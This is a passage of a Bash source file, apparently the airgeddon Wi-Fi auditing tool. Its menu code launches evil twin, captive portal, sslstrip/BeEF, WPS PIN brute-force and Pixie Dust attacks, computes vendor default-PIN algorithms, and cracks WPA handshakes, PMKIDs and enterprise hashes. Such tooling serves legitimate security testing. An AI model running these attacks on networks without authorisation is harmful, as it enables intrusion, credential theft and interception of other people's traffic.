	esac

	enterprise_attacks_menu
}

#Evil Twin attacks menu
function evil_twin_attacks_menu() {

	debug_print

	clear
	language_strings "${language}" 253 "title"
	current_menu="evil_twin_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 255 "separator"
	language_strings "${language}" 256 et_onlyap_dependencies[@]
	language_strings "${language}" 257 "separator"
	language_strings "${language}" 259 et_sniffing_dependencies[@]
	language_strings "${language}" 261 et_sniffing_sslstrip2_dependencies[@]
	language_strings "${language}" 396
	language_strings "${language}" 262 "separator"
	language_strings "${language}" 263 et_captive_portal_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " et_option
	case ${et_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			explore_for_targets_option
		;;
		5)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					if [ "${card_vif_support}" -eq 0 ]; then
						ask_yesno 696 "no"
						if [ "${yesno}" = "y" ]; then
							et_attack_adapter_prerequisites_ok=1
						fi
					else
						et_attack_adapter_prerequisites_ok=1
					fi

					if [ "${et_attack_adapter_prerequisites_ok}" -eq 1 ]; then

						declare -gA ports_needed
						ports_needed["tcp"]=""
						ports_needed["udp"]="67"
						if check_busy_ports; then

							et_mode="et_onlyap"
							et_dos_menu
						fi
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		6)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					if [ "${card_vif_support}" -eq 0 ]; then
						ask_yesno 696 "no"
						if [ "${yesno}" = "y" ]; then
							et_attack_adapter_prerequisites_ok=1
						fi
					else
						et_attack_adapter_prerequisites_ok=1
					fi

					if [ "${et_attack_adapter_prerequisites_ok}" -eq 1 ]; then

						declare -gA ports_needed
						ports_needed["tcp"]=""
						ports_needed["udp"]="67"
						if check_busy_ports; then

							et_mode="et_sniffing"
							et_dos_menu
						fi
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		7)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					get_bettercap_version
					if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}" && ! compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_sslstrip_working_version}"; then
						echo
						language_strings "${language}" 174 "red"
						language_strings "${language}" 115 "read"
					else
						if [ "${card_vif_support}" -eq 0 ]; then
							ask_yesno 696 "no"
							if [ "${yesno}" = "y" ]; then
								et_attack_adapter_prerequisites_ok=1
							fi
						else
							et_attack_adapter_prerequisites_ok=1
						fi

						if [ "${et_attack_adapter_prerequisites_ok}" -eq 1 ]; then

							declare -gA ports_needed
							ports_needed["tcp"]="${bettercap_proxy_port}"
							ports_needed["udp"]="67 ${bettercap_dns_port}"
							if check_busy_ports; then

								et_mode="et_sniffing_sslstrip2"
								et_dos_menu
							fi
						fi
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		8)
			beef_pre_menu
		;;
		9)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					if [ "${card_vif_support}" -eq 0 ]; then
						ask_yesno 696 "no"
						if [ "${yesno}" = "y" ]; then
							et_attack_adapter_prerequisites_ok=1
						fi
					else
						et_attack_adapter_prerequisites_ok=1
					fi

					if [ "${et_attack_adapter_prerequisites_ok}" -eq 1 ]; then

						declare -gA ports_needed
						ports_needed["tcp"]="53 80"
						ports_needed["udp"]="53 67"
						if check_busy_ports; then

							et_mode="et_captive_portal"
							echo
							language_strings "${language}" 316 "yellow"
							language_strings "${language}" 115 "read"

							if explore_for_targets_option "WPA"; then
								et_dos_menu
							fi
						fi
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	evil_twin_attacks_menu
}

#beef pre attack menu
function beef_pre_menu() {

	debug_print

	if [ ${return_to_et_main_menu_from_beef} -eq 1 ]; then
		return
	fi

	search_for_beef

	clear
	language_strings "${language}" 407 "title"
	current_menu="beef_pre_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 266
	print_simple_separator

	if [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 1 ]]; then
		if [[ ${optional_tools[${optional_tools_names[5]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[6]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[7]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[16]}]} -eq 1 ]]; then
			language_strings "${language}" 409 "warning"
			language_strings "${language}" 416 "pink"
		else
			language_strings "${language}" 409 et_sniffing_sslstrip2_beef_dependencies[@]
		fi
	else
		language_strings "${language}" 409 et_sniffing_sslstrip2_beef_dependencies[@]
	fi

	print_simple_separator
	language_strings "${language}" 410
	print_hint ${current_menu}

	read -rp "> " beef_option
	case ${beef_option} in
		0)
			return
		;;
		1)
			if contains_element "${beef_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					get_bettercap_version
					if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}" && ! compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_sslstrip_working_version}"; then
						echo
						language_strings "${language}" 174 "red"
						language_strings "${language}" 115 "read"
						return
					fi

					if [ "${card_vif_support}" -eq 0 ]; then
						ask_yesno 696 "no"
						if [ "${yesno}" = "y" ]; then
							et_attack_adapter_prerequisites_ok=1
						else
							return_to_et_main_menu_from_beef=1
						fi
					else
						et_attack_adapter_prerequisites_ok=1
					fi

					if [ "${et_attack_adapter_prerequisites_ok}" -eq 1 ]; then

						declare -gA ports_needed
						ports_needed["tcp"]="2000 ${beef_port} 6789 ${bettercap_proxy_port}"
						ports_needed["udp"]="53 67 ${bettercap_dns_port}"
						if check_busy_ports; then

							et_mode="et_sniffing_sslstrip2_beef"
							et_dos_menu
						fi
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		2)
			if [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 1 ]]; then
				echo
				language_strings "${language}" 412 "red"
				language_strings "${language}" 115 "read"
			else
				prepare_beef_start
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	beef_pre_menu
}

#WPS attacks menu
function wps_attacks_menu() {

	debug_print

	clear
	language_strings "${language}" 334 "title"
	current_menu="wps_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49 wash_scan_dependencies[@]
	language_strings "${language}" 50 "separator"
	language_strings "${language}" 345 bully_attacks_dependencies[@]
	language_strings "${language}" 357 reaver_attacks_dependencies[@]
	language_strings "${language}" 346 bully_pixie_dust_attack_dependencies[@]
	language_strings "${language}" 358 reaver_pixie_dust_attack_dependencies[@]
	language_strings "${language}" 347 bully_attacks_dependencies[@]
	language_strings "${language}" 359 reaver_attacks_dependencies[@]
	language_strings "${language}" 348 bully_attacks_dependencies[@]
	language_strings "${language}" 360 reaver_attacks_dependencies[@]
	language_strings "${language}" 622 reaver_attacks_dependencies[@]
	print_simple_separator
	language_strings "${language}" 494
	print_hint ${current_menu}

	read -rp "> " wps_option
	case ${wps_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_reaver_version
				explore_for_wps_targets_option
			fi
		;;
		5)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="custompin_bully"
				get_bully_version
				set_bully_verbosity
				if wps_attacks_parameters; then
					manage_wps_log
					exec_wps_custom_pin_bully_attack
				fi
			fi
		;;
		6)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="custompin_reaver"
				if wps_attacks_parameters; then
					manage_wps_log
					exec_wps_custom_pin_reaver_attack
				fi
			fi
		;;
		7)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="pixiedust_bully"
				get_bully_version
				set_bully_verbosity
				if validate_bully_pixiewps_version; then
					echo
					language_strings "${language}" 368 "yellow"
					language_strings "${language}" 115 "read"
					if wps_attacks_parameters; then
						manage_wps_log
						exec_bully_pixiewps_attack
					fi
				else
					echo
					language_strings "${language}" 367 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		8)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="pixiedust_reaver"
				get_reaver_version
				if validate_reaver_pixiewps_version; then
					echo
					language_strings "${language}" 370 "yellow"
					language_strings "${language}" 115 "read"
					if wps_attacks_parameters; then
						manage_wps_log
						exec_reaver_pixiewps_attack
					fi
				else
					echo
					language_strings "${language}" 371 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		9)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="bruteforce_bully"
				get_bully_version
				set_bully_verbosity
				if wps_attacks_parameters; then
					manage_wps_log
					exec_wps_bruteforce_pin_bully_attack
				fi
			fi
		;;
		10)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="bruteforce_reaver"
				get_reaver_version
				if wps_attacks_parameters; then
					manage_wps_log
					exec_wps_bruteforce_pin_reaver_attack
				fi
			fi
		;;
		11)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="pindb_bully"
				get_bully_version
				set_bully_verbosity

				db_error=0
				if [[ ${pin_dbfile_checked} -eq 0 ]] || [[ ! -f "${scriptfolder}${known_pins_dbfile}" ]]; then
					if check_pins_database_file; then
						echo
						language_strings "${language}" 373 "blue"
					else
						echo
						language_strings "${language}" 372 "red"
						db_error=1
					fi
				else
					echo
					language_strings "${language}" 379 "blue"
				fi
				language_strings "${language}" 115 "read"

				if [ "${db_error}" -eq 0 ]; then
					if wps_attacks_parameters; then
						manage_wps_log
						exec_wps_pin_database_bully_attack
					fi
				fi
			fi
		;;
		12)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="pindb_reaver"
				get_reaver_version

				db_error=0
				if [[ ${pin_dbfile_checked} -eq 0 ]] || [[ ! -f "${scriptfolder}${known_pins_dbfile}" ]]; then
					if check_pins_database_file; then
						echo
						language_strings "${language}" 373 "blue"
					else
						echo
						language_strings "${language}" 372 "red"
						db_error=1
					fi
				else
					echo
					language_strings "${language}" 379 "blue"
				fi
				language_strings "${language}" 115 "read"
				if [ "${db_error}" -eq 0 ]; then
					if wps_attacks_parameters; then
						manage_wps_log
						exec_wps_pin_database_reaver_attack
					fi
				fi
			fi
		;;
		13)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wps_attack="nullpin_reaver"
				get_reaver_version
				if validate_reaver_nullpin_version; then
					echo
					language_strings "${language}" 623 "yellow"
					language_strings "${language}" 115 "read"
					if wps_attacks_parameters; then
						manage_wps_log
						exec_reaver_nullpin_attack
					fi
				else
					echo
					language_strings "${language}" 624 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		14)
			offline_pin_generation_menu
		;;
		*)
			invalid_menu_option
		;;
	esac

	wps_attacks_menu
}

#Offline pin generation menu
function offline_pin_generation_menu() {

	debug_print

	clear
	language_strings "${language}" 495 "title"
	current_menu="offline_pin_generation_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 497
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49 wash_scan_dependencies[@]
	language_strings "${language}" 498 "separator"
	language_strings "${language}" 496
	echo "6.  ComputePIN"
	echo "7.  EasyBox"
	echo "8.  Arcadyan"
	print_hint ${current_menu}

	read -rp "> " offline_pin_generation_option
	case ${offline_pin_generation_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_reaver_version
				explore_for_wps_targets_option
			fi
		;;
		5)
			db_error=0
			if [[ ${pin_dbfile_checked} -eq 0 ]] || [[ ! -f "${scriptfolder}${known_pins_dbfile}" ]]; then
				if check_pins_database_file; then
					echo
					language_strings "${language}" 373 "blue"
				else
					echo
					language_strings "${language}" 372 "red"
					db_error=1
				fi
			else
				echo
				language_strings "${language}" 379 "blue"
			fi
			language_strings "${language}" 115 "read"

			if [ "${db_error}" -eq 0 ]; then
				if wps_attacks_parameters "no_monitor_check"; then
					wps_pin_database_prerequisites "no_attack"
					if [ ${bssid_found_in_db} -eq 1 ]; then
						echo
						language_strings "${language}" 499 "blue"
						echo "${wps_data_array["${wps_bssid}",'Database']}"
						echo
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		6)
			if wps_attacks_parameters "no_monitor_check"; then
				if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "ComputePIN"; then
					set_wps_mac_parameters
					calculate_computepin_algorithm_step1
					pin_checksum_rule "${computepin_pin}"
					calculate_computepin_algorithm_step2
					fill_wps_data_array "${wps_bssid}" "ComputePIN" "${computepin_pin}"
				fi

				echo
				language_strings "${language}" 500 "blue"
				echo "${wps_data_array["${wps_bssid}",'ComputePIN']}"
				echo
				language_strings "${language}" 115 "read"
			fi
		;;
		7)
			if wps_attacks_parameters "no_monitor_check"; then
				if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "EasyBox"; then
					set_wps_mac_parameters
					calculate_easybox_algorithm
					pin_checksum_rule "${easybox_pin}"
					easybox_pin=$(printf '%08d\n' $((current_calculated_pin + checksum_digit)))
					fill_wps_data_array "${wps_bssid}" "EasyBox" "${easybox_pin}"
				fi

				echo
				language_strings "${language}" 501 "blue"
				echo "${wps_data_array["${wps_bssid}",'EasyBox']}"
				echo
				language_strings "${language}" 115 "read"
			fi
		;;
		8)
			if wps_attacks_parameters "no_monitor_check"; then
				offline_arcadyan_pin_can_be_shown=0
				if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "Arcadyan"; then

					ask_yesno 504 "yes"
					if [ "${yesno}" = "y" ]; then

						if check_monitor_enabled "${interface}"; then
							if hash wash 2> /dev/null; then
								if check_json_option_on_wash; then

									echo
									language_strings "${language}" 489 "blue"

									serial=""
									if wash_json_scan "${wps_bssid}"; then
										if [ -n "${serial}" ]; then
											if [[ "${serial}" =~ ^[0-9]{4}$ ]]; then
												set_wps_mac_parameters
												calculate_arcadyan_algorithm
												pin_checksum_rule "${arcadyan_pin}"
												arcadyan_pin="${arcadyan_pin}${checksum_digit}"
												fill_wps_data_array "${wps_bssid}" "Arcadyan" "${arcadyan_pin}"
												offline_arcadyan_pin_can_be_shown=1
											else
												echo
												language_strings "${language}" 491 "yellow"
												language_strings "${language}" 115 "read"
											fi
											echo
										else
											echo
											language_strings "${language}" 488 "red"
											language_strings "${language}" 115 "read"
										fi
									fi
								else
									echo
									language_strings "${language}" 486 "red"
									language_strings "${language}" 115 "read"
								fi
							else
								echo
								language_strings "${language}" 492 "red"
								language_strings "${language}" 115 "read"
							fi
						else
							echo
							language_strings "${language}" 14 "red"
							language_strings "${language}" 115 "read"
						fi
					fi
				else
					echo
					language_strings "${language}" 503 "yellow"
					language_strings "${language}" 115 "read"
					offline_arcadyan_pin_can_be_shown=1
				fi

				if [ "${offline_arcadyan_pin_can_be_shown}" -eq 1 ]; then
					echo
					language_strings "${language}" 502 "blue"
					echo "${wps_data_array["${wps_bssid}",'Arcadyan']}"
					echo
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	offline_pin_generation_menu
}

#WEP attacks menu
function wep_attacks_menu() {

	debug_print

	clear
	language_strings "${language}" 427 "title"
	current_menu="wep_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 50 "separator"
	language_strings "${language}" 423 wep_attack_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " wep_option
	case ${wep_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			explore_for_targets_option "WEP"
		;;
		5)
			if contains_element "${wep_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				wep_option
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	wep_attacks_menu
}

#Offline decryption attacks menu
function decrypt_menu() {

	debug_print

	clear
	language_strings "${language}" 170 "title"
	current_menu="decrypt_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 534
	language_strings "${language}" 535
	print_hint ${current_menu}

	read -rp "> " decrypt_option
	case ${decrypt_option} in
		0)
			return
		;;
		1)
			personal_decrypt_menu
		;;
		2)
			enterprise_decrypt_menu
		;;
		*)
			invalid_menu_option
		;;
	esac

	decrypt_menu
}

#Offline personal decryption attacks menu
function personal_decrypt_menu() {

	debug_print

	clear
	language_strings "${language}" 170 "title"
	current_menu="personal_decrypt_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 536
	language_strings "${language}" 176 "separator"
	language_strings "${language}" 172
	language_strings "${language}" 175 aircrack_crunch_attacks_dependencies[@]
	language_strings "${language}" 229 "separator"
	language_strings "${language}" 230 hashcat_attacks_dependencies[@]
	language_strings "${language}" 231 hashcat_attacks_dependencies[@]
	language_strings "${language}" 232 hashcat_attacks_dependencies[@]
	language_strings "${language}" 668 hashcat_attacks_dependencies[@]
	language_strings "${language}" 669 hashcat_attacks_dependencies[@]
	language_strings "${language}" 670 hashcat_attacks_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " personal_decrypt_option
	case ${personal_decrypt_option} in
		0)
			return
		;;
		1)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				aircrack_dictionary_attack_option
			fi
		;;
		2)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				aircrack_bruteforce_attack_option
			fi
		;;
		3)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_dictionary_attack_option "personal_handshake"
			fi
		;;
		4)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_bruteforce_attack_option "personal_handshake"
			fi
		;;
		5)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_rulebased_attack_option "personal_handshake"
			fi
		;;
		6)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				if validate_hashcat_pmkid_version; then
					echo
					language_strings "${language}" 678 "yellow"
					language_strings "${language}" 115 "read"
					set_hashcat_parameters
					hashcat_dictionary_attack_option "personal_pmkid"
				else
					echo
					language_strings "${language}" 679 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		7)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				if validate_hashcat_pmkid_version; then
					echo
					language_strings "${language}" 678 "yellow"
					language_strings "${language}" 115 "read"
					set_hashcat_parameters
					hashcat_bruteforce_attack_option "personal_pmkid"
				else
					echo
					language_strings "${language}" 679 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		8)
			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				if validate_hashcat_pmkid_version; then
					echo
					language_strings "${language}" 678 "yellow"
					language_strings "${language}" 115 "read"
					set_hashcat_parameters
					hashcat_rulebased_attack_option "personal_pmkid"
				else
					echo
					language_strings "${language}" 679 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	personal_decrypt_menu
}

#Offline enterprise decryption attacks menu
function enterprise_decrypt_menu() {

	debug_print

	clear
	language_strings "${language}" 170 "title"
	current_menu="enterprise_decrypt_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 536
	language_strings "${language}" 544 "separator"
	language_strings "${language}" 545 john_attacks_dependencies[@]
	language_strings "${language}" 546 johncrunch_attacks_dependencies[@]
	language_strings "${language}" 229 "separator"
	language_strings "${language}" 550 hashcat_attacks_dependencies[@]
	language_strings "${language}" 551 hashcat_attacks_dependencies[@]
	language_strings "${language}" 552 hashcat_attacks_dependencies[@]
	language_strings "${language}" 548 "separator"
	language_strings "${language}" 549 asleap_attacks_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " enterprise_decrypt_option
	case ${enterprise_decrypt_option} in
		0)
			return
		;;
		1)
			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_jtr_version
				enterprise_jtr_dictionary_attack_option
			fi
		;;
		2)
			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_jtr_version
				enterprise_jtr_bruteforce_attack_option
			fi
		;;
		3)
			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_dictionary_attack_option "enterprise"
			fi
		;;
		4)
			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_bruteforce_attack_option "enterprise"
			fi
		;;
		5)
			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				get_hashcat_version
				set_hashcat_parameters
				hashcat_rulebased_attack_option "enterprise"
			fi
		;;
		6)
			if contains_element "${enterprise_decrypt_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				enterprise_asleap_dictionary_attack_option
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	enterprise_decrypt_menu
}

#Read the user input on rules file questions
function ask_rules() {

	debug_print

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "rules"
	done
	language_strings "${language}" 241 "yellow"
}

#Read the user input on dictionary file questions
function ask_dictionary() {

	debug_print

	validpath=1
	while [[ "${validpath}" != "0" ]]; do
		read_path "dictionary"
	done
	language_strings "${language}" 181 "yellow"
}

#Read the user input on Handshake/enterprise file questions
function ask_capture_file() {

	debug_print

	validpath=1

	if [ "${1}" = "personal_handshake" ]; then
		while [[ "${validpath}" != "0" ]]; do
			read_path "targetfilefordecrypt"
		done
	elif [ "${1}" = "personal_pmkid" ]; then
		while [[ "${validpath}" != "0" ]]; do
			read_path "targethashcatpmkidfilefordecrypt"
		done
	else
		if [ "${2}" = "hashcat" ]; then
			while [[ "${validpath}" != "0" ]]; do
				read_path "targethashcatenterprisefilefordecrypt"
			done
		else
			while [[ "${validpath}" != "0" ]]; do
				read_path "targetjtrenterprisefilefordecrypt"
			done
		fi
	fi
	language_strings "${language}" 189 "yellow"
}

#Manage the questions on Handshake/enterprise file questions
function manage_asking_for_captured_file() {

	debug_print

	if [ "${1}" = "personal_handshake" ]; then
		if [ -n "${enteredpath}" ]; then
			echo
			language_strings "${language}" 186 "blue"
			ask_yesno 187 "yes"
			if [ "${yesno}" = "n" ]; then
				ask_capture_file "${1}" "${2}"
			fi
		else
			ask_capture_file "${1}" "${2}"
		fi
	elif [ "${1}" = "personal_pmkid" ]; then
		if [ -n "${hashcatpmkidenteredpath}" ]; then
			echo
			language_strings "${language}" 677 "blue"
			ask_yesno 187 "yes"
			if [ "${yesno}" = "n" ]; then
				ask_capture_file "${1}" "${2}"
			fi
		else
			ask_capture_file "${1}" "${2}"
		fi
	else
		if [ "${2}" = "hashcat" ]; then
			if [ -n "${hashcatenterpriseenteredpath}" ]; then
				echo
				language_strings "${language}" 600 "blue"
				ask_yesno 187 "yes"
				if [ "${yesno}" = "n" ]; then
					ask_capture_file "${1}" "${2}"
				fi
			else
				ask_capture_file "${1}" "${2}"
			fi
		else
			if [ -n "${jtrenterpriseenteredpath}" ]; then
				echo
				language_strings "${language}" 609 "blue"
				ask_yesno 187 "yes"
				if [ "${yesno}" = "n" ]; then
					ask_capture_file "${1}" "${2}"
				fi
			else
				ask_capture_file "${1}" "${2}"
			fi
		fi
	fi
}

#Manage the questions on challenge response input
manage_asking_for_challenge_response() {

	debug_print

	local regexp="^([[:xdigit:]]{2}:){7}[[:xdigit:]]{2}$"

	while [[ ! ${enterprise_asleap_challenge} =~ ${regexp} ]]; do
		read_challenge
	done

	regexp="^([[:xdigit:]]{2}:){23}[[:xdigit:]]{2}$"

	while [[ ! ${enterprise_asleap_response} =~ ${regexp} ]]; do
		read_response
	done
}

#Manage the questions on dictionary file questions
function manage_asking_for_dictionary_file() {

	debug_print

	if [ -n "${DICTIONARY}" ]; then
		echo
		language_strings "${language}" 183 "blue"
		ask_yesno 184 "yes"
		if [ "${yesno}" = "n" ]; then
			ask_dictionary
		fi
	else
		ask_dictionary
	fi
}

#Manage the questions on rules file questions
function manage_asking_for_rule_file() {

	debug_print

	if [ -n "${RULES}" ]; then
		echo
		language_strings "${language}" 239 "blue"
		ask_yesno 240 "yes"
		if [ "${yesno}" = "n" ]; then
			ask_rules
		fi
	else
		ask_rules
	fi
}

#Validate the file to be cleaned
function check_valid_file_to_clean() {

	debug_print

	nets_from_file=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA|WEP" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')

	if [ "${nets_from_file}" = "" ]; then
		return 1
	fi

	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$((option_counter + 1))
		fi
	done

	if [ ${option_counter} -le 1 ]; then
		return 1
	fi

	handshakefilesize=$(wc -c "${filetoclean}" 2> /dev/null | awk -F " " '{print$1}')
	if [ "${handshakefilesize}" -le 1024 ]; then
		return 1
	fi

	if ! echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "1 handshake" > /dev/null; then
		return 1
	fi

	return 0
}

#Check if a bssid is present on a capture file to know if there is a Handshake/PMKID with that bssid
function check_bssid_in_captured_file() {

	debug_print

	local nets_from_file
	nets_from_file=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')

	if [ "${3}" = "also_pmkid" ]; then
		get_aircrack_version
		if compare_floats_greater_or_equal "${aircrack_version}" "${aircrack_pmkid_version}"; then
			local nets_from_file2
			nets_from_file2=$(echo "1" | timeout -s SIGTERM 3 aircrack-ng "${1}" 2> /dev/null | grep -E "WPA \([1-9][0-9]? handshake|handshake, with PMKID" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')
		fi
	fi

	if [ "${2}" != "silent" ]; then
		if [ ! -f "${1}" ]; then
			echo
			language_strings "${language}" 161 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi

		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "only_handshake" ]]; then
			if [ "${nets_from_file}" = "" ]; then
				echo
				language_strings "${language}" 216 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		fi

		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "also_pmkid" ]]; then
			if [[ "${nets_from_file}" = "" ]] && [[ "${nets_from_file2}" = "" ]]; then
				echo
				language_strings "${language}" 682 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		fi
	fi

	declare -A bssids_detected
	declare -A bssids_detected_pmkid

	local option_counter
	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$((option_counter + 1))
			bssids_detected[${option_counter}]=${item}
		fi
	done

	if [[ "${3}" = "also_pmkid" ]] && [[ -n "${nets_from_file2}" ]]; then
		option_counter=0
		for item in ${nets_from_file2}; do
